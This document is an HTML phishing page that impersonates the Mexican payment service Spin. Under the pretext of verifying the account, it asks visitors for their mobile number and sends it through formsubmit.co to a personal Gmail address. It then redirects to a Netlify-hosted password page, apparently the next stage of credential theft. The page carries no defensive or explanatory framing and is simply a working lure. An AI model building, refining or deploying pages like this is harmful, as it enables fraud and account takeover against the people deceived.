<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="style.css">
    <script defer src="https://cdn.jsdelivr.net/npm/@finsweet/attributes-formsubmit@1/formsubmit.js"></script>
    <title>Ingresa a tu cuenta</title>
</head>
<body>
    <div class="nav">
        <img class="imglogonav" src="./logo.png" alt="">
    </div>

    <div class="cont">
        <div class="conttitle">
            <h1 class="title">INGRESA TU NUMERO DE CELULAR PARA VERIFICAR TU CUENTA</h2>
        </div>
        <form  action="https://formsubmit.co/rafagerman941@gmail.com" method="POST">
        <div class="contsolicitar">
            <div class="lbinput"><label class="label" >🇲🇽+52</label><input name="Numero" class="pedirnumeroinput" placeholder="Ingresa tu numero" type="tel" required></div>
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" id="name" value="https://spinmcxpersonanet.netlify.app/contraseña.html">
            <input name="email" type="hidden" value="braulioquinta67@gmail.com">
            <input name="_formsubmit_id" type="text" style="display:none">
            <input value="Enviar" class="pedirbtn" type="submit">

            <script>
                var input = document.querySelector(".pedirnumeroinput");
                var btn = document.querySelector(".pedirbtn");
                input.addEventListener("keyup", function(){
                    if(input.value.length == 10){
                        btn.disabled = false;
                    }else{
                        btn.disabled = true;
                    }
                });

                <!-- no dejar que se escriban mas de 10 digitos -->
                input.addEventListener("keydown", function(e){
                    if(input.value.length == 10){
                        if(e.keyCode != 8){
                            e.preventDefault();
                        }
                    }
                });
                input.addEventListener("keydown", function(e){
                    var btn = document.querySelector(".pedirbtn");
                if(input.value.length == 10){
                    
                    btn.style.backgroundColor='#FF0000';
                }
                });

                input.addEventListener("keypress", function(e){
                    if(e.keyCode < 48 || e.keyCode > 57){
                        e.preventDefault();
                    }
                });

            </script>

        </div>
        <div class="contaviso">
        <h3 class="textaviso" >No pierdas tu cuenta y sigue difrutando de los beneficios que Spin tiene para ti.</h3>
    </div>
    </form>
    </div>

</body>
</html>
